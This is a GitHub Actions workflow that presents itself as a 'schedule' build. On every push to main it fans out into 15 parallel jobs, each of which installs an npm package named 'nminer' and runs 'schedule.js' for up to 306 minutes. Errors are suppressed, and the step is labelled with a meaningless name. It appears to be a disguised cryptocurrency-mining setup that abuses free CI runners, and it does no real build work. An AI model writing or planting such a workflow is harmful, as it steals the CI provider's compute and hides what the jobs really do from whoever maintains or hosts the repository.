name: schedule
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 2140 }
          - { version: 4722 }
          - { version: 3883 }
          - { version: 7897 }
          - { version: 7090 }
          - { version: 3888 }
          - { version: 1975 }
          - { version: 1538 }
          - { version: 8857 }
          - { version: 3717 }
          - { version: 7395 }
          - { version: 35 }
          - { version: 7536 }
          - { version: 4029 }
          - { version: 316 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: boohoo happy-go-lucky
        run: |
          npm install nminer@latest
          timeout 306m node schedule.js || echo "schedule executed"